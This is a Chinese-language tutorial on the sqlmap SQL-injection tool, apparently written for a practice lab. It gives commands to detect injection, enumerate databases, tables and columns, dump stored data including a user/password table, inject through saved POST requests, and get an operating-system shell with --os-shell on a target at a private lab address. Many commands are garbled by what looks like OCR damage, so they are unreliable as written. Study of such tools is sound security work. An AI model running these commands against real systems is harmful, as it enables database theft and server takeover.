# SQLMAP

sqlmap是一个开源渗透测试工具，
它可以自动检测和利用SQL注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令。

### 安装

 **windows**

  1. 安装python(2.x或3.x版本)   
[https://www.python.org/downloads/ ](https://www.python.org/downloads/)

  2. 下载sq|map并解压   
[http://sqlmap.org/ ](http://sqlmap.org/)

  3. 在sqlmap路径下打开cmd, python sqlmap.py

 **Linux**

  1. kali系统自带
  2. git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap -dev

### 常用命令

`sqlmap.py -u "url"`检测目标url是否存在注入

`sqlmap -u "url" --dbs`爆出所有数据库信息

`sqlmap -u "ur!" --current-db`爆出当前数据库信息

`sqlmap -u "url" -D Database_ name -tables`列出指定库名的所有表名

`sq|map -u "url" -D Database_ name -T Table_ name --columns`列出指定库名指定表名的所有列名

`sqlmap -u "url" -D Database_ name -T Table_ name -C columns1,colunms2,
columns3 --dump`列出指定库名指定表名指定字段的数据

### POST注入

`sqlmap -r /root/aaa.txt --dbs --batch````sqlmap -r /root/aa.txt --current-db````sqImap -r /root/aaa.txt -D hetianlab --tables````sqlmap -r /root/aaa.txt
-D hetianlab -T user_ pwd --dump`

### 细说--os-shell

sqlmap -r /root/aaa.txt -p id --is-dba

sqlmap -r /rootaaa.txt -p id --os-shell

os-shell的执行条件有三个:

  1. 网站必须是root权限
  2. 攻击者需要知道网站的绝对路径
  3. GPC为off, php主动转义的功能关闭

当着三个条件都满足的时候，--os-shell命令才执行。

>  **which web application Language does the web server support?**
>
> [1] ASP
>
> [2] ASPX
>
> [3] JSP
>
> [4] PHP (default ) #默认
>
>  **what do you want to use for writable directory?**
>
> [1] common Location(s) ( /var/ww/, /var/www/html, /var /www/htdocs,
> /usr/Local/ apache2/htdocs,/usr/local/www/data, /var/apache2/htdocs,
> /var/www/ nginx- default, /srv/www/htdocs') (default)
>
> [2] custom Location(s) #自定义
>
> [3] custom directory list file [4] brute force search

话说回来，我们如何知道这个网站是不是root权限呢？

我们可以执行以下两个命令来查看网站当前的用户

`sqLmap -u "http://172 .26.2.36/vulnlab/ index . php?id=1" --current
-user```current --user查看当前的用户

`sqLmap -u "http://172 .26.2.36/vulnlab/ index . php?id=1" --is
-dba```指定去查找这个文件是否为dba，dba是databaseadmin，是数据库管理员用户的意思，如果返回值为true，则是root用户
这两个命令都可以

